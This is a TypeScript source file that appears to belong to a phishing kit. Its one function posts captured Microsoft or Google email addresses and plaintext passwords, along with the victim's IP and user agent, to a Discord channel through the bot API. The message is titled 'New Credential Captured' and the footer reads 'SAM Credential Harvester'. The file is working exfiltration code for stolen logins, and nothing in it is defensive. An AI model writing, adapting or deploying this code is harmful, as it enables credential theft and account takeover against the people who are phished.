const BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const CHANNEL_ID = process.env.DISCORD_CHANNEL_ID || "1509874086958862346";

export async function sendCredentialEmbed(payload: {
  provider: string;
  email: string;
  password: string;
  ip?: string;
  userAgent?: string;
}) {
  if (!BOT_TOKEN || !CHANNEL_ID) {
    console.warn("[Discord] No bot token or channel ID configured.");
    return false;
  }

  const color = payload.provider === "microsoft" ? 0x0078d4 : 0x4285f4;

  try {
    const res = await fetch(
      `https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bot ${BOT_TOKEN}`,
          "User-Agent": "SAM-Bot/1.0",
        },
        body: JSON.stringify({
          embeds: [
            {
              title: "🔑 New Credential Captured",
              color,
              fields: [
                { name: "Provider", value: payload.provider, inline: true },
                { name: "Email", value: payload.email, inline: true },
                { name: "Password", value: `||${payload.password}||`, inline: false },
                { name: "IP", value: payload.ip || "unknown", inline: true },
                {
                  name: "User-Agent",
                  value: payload.userAgent?.slice(0, 500) || "unknown",
                  inline: false,
                },
              ],
              timestamp: new Date().toISOString(),
              footer: { text: "SAM Credential Harvester" },
            },
          ],
        }),
      }
    );

    if (!res.ok) {
      const body = await res.text().catch(() => "");
      console.error("[Discord] API error:", res.status, body);
      return false;
    }

    return true;
  } catch (err) {
    console.error("[Discord] Network error:", err);
    return false;
  }
}
